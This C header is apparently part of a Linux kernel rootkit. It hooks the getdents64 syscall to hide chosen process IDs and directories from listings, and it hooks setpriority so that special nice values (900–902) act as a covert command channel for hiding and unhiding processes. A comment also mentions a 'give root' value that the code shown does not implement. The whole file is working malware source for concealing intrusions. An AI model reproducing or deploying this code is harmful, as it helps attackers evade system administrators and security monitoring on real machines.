#ifndef INSTALL_HOOKS_H
#define INSTALL_HOOKS_H
#include "hook.h"
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/list.h>
#include <stdbool.h>


// getdents64 HOOK Functionality
//create_original(long, getdents64);

struct hidden_dir_st{
	char dirname[128];
	bool is_prefix;

	struct list_head lhead;
};


LIST_HEAD(hidden_dirs);

static void add_hidden_dir(const char * dname, int nice_value){
	struct hidden_dir_st * new_dir = kmalloc(sizeof(struct hidden_dir_st), GFP_KERNEL);
	strncpy(new_dir->dirname, dname, 128);
	new_dir->is_prefix = false;
	if (nice_value == 901){
		new_dir->is_prefix = true;
	}

	INIT_LIST_HEAD(&new_dir->lhead);
	list_add(&new_dir->lhead, &hidden_dirs);
}

static void delete_hidden_dir(const char * dirname){
	struct hidden_dir_st * hid = NULL, *hid2 = NULL;
	list_for_each_entry_safe(hid, hid2, &hidden_dirs, lhead){
		if (!strncmp(hid->dirname, dirname, strlen(dirname))){
			list_del(&hid->lhead);
			kfree(hid);
			return;
		}
	}

}

static void delete_whole_list(void){
	struct hidden_dir_st * hid = NULL, *hid2 = NULL;
	list_for_each_entry_safe(hid, hid2, &hidden_dirs, lhead){
		list_del(&hid->lhead);
		kfree(hid);
	}
}

bool target_dir(const char * name){
	struct hidden_dir_st * hidden = NULL;
	list_for_each_entry(hidden, &hidden_dirs, lhead){
		if (!strncmp(hidden->dirname, name, strlen(hidden->dirname)) && hidden->is_prefix){
			return true;
		}else if (!strcmp(hidden->dirname, name)){
			return true;
		}
	}
	return false;
}

static long (*getdents64)(const struct pt_regs * registers);
static long hooked_getdents64 (const struct pt_regs * registers){
	long ret = 0;
	long err = 0;
	long offset = 0;
	struct linux_dirent64 __user * user_dirent = NULL;
	struct linux_dirent64 * kern_dirent = NULL, *entry = NULL;
	ret = getdents64(registers);
	if (ret <= 0)
		return ret;

	user_dirent = (struct linux_dirent64 __user *)registers->si;
	kern_dirent = kmalloc(ret, GFP_KERNEL);
	if (kern_dirent == NULL)
		return ret;

	err = copy_from_user(kern_dirent, user_dirent, ret);
	if (err)
		goto end;

	while(offset < ret){
		entry = (void*)kern_dirent + offset;
		if (target_dir(entry->d_name)){
			ret -= entry->d_reclen;
			memmove(entry, (void*)entry + entry->d_reclen, ret - offset);
			continue;
		}
		offset += entry->d_reclen;
	}

	copy_to_user(user_dirent, kern_dirent, ret);

	end:
		kfree(kern_dirent);
		return ret;
}


// nice_value = 200 -> hide process
// nice_value = 100 -> give root
// 900 / 901 -> hides process
// 902 -> shows process
static int (*setpriority_syscall)(const struct pt_regs * registers);
static int hooked_setpriority(const struct pt_regs * registers){
	int pid = registers->si;
	int niceval = registers->dx;

	// string conversion
	char * temp = kmalloc(128, GFP_KERNEL);
	sprintf(temp, "%d", pid);

	pr_info("niceval=%d pid=%s\n", niceval, temp);
	if (niceval == 900 || niceval == 901){
		add_hidden_dir(temp, niceval);
	}else if (niceval == 902){
		delete_hidden_dir(temp);
	}
	kfree(temp);
	return 0;
}

hook getdents64_hook	= create_hook("__x64_sys_getdents64", hooked_getdents64, &getdents64);
hook setpriority_hook	= create_hook("__x64_sys_setpriority", hooked_setpriority, &setpriority_syscall);

static void install_all_hooks(void){
	InstallHook(&getdents64_hook);
	InstallHook(&setpriority_hook);
}

static void remove_all_hooks(void){
	RemoveHook(&getdents64_hook);
	RemoveHook(&setpriority_hook);
}




#endif // INSTALL_HOOKS_H

